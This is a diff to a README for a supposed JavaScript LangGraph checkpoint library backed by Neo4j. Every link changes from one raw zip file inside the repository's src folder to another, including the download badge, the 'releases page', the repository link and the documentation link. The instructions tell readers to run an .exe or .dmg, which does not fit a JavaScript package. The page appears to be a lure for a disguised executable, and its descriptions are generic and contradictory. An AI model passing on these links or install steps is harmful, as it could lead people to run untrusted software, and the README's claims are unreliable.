@@ -1,7 +1,7 @@
 # 🛠️ langgraph-checkpoint-neo4j-js - Save Conversations for Future Use
 
 ## 📥 Download Now
-[![Download](https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip)](https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip)
+[![Download](https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip)](https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip)
 
 ## 📋 Overview
 **langgraph-checkpoint-neo4j-js** is a tool designed to help you save conversations for future use. By connecting with Neo4j, it offers persistent memory for agents, allowing them to recall past discussions and even explore branching scenarios. This means that every time you chat with the agent, it can bring previous interactions to life, making your experience richer and more engaging.
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets the following requirements:
 To get started, you'll need to download the software. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   - [Download the latest version here](https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip)
+   - [Download the latest version here](https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip)
 
 2. **Select the Version:** On the releases page, you will see various versions of the application available for download. Choose the most recent version.
 
@@ -30,7 +30,7 @@ To get started, you'll need to download the software. Follow these steps:
 
    - **Windows:** Double-click the `.exe` file.
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the files from the `https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip` or follow the specific installation instructions for your distribution.
+   - **Linux:** Extract the files from the `https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip` or follow the specific installation instructions for your distribution.
 
 5. **Run the Application:** Once installed, open the application by clicking on its icon. 
 
@@ -60,8 +60,8 @@ If you encounter any issues while using langgraph-checkpoint-neo4j-js:
 3. **Visit the Support Page**: Check the FAQ section on the GitHub repository for common issues and solutions.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip)
-- [Documentation](https://github.com/danielsxpl/langgraph-checkpoint-neo4j-js/raw/refs/heads/master/src/langgraph_j_js_neo_checkpoint_v1.9-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/danielsxpl/langgraph-checkpoint-neo4j-js/master/src/checkpoint_langgraph_j_js_neo_3.2.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. You are free to use and modify the software according to the terms specified in the license.
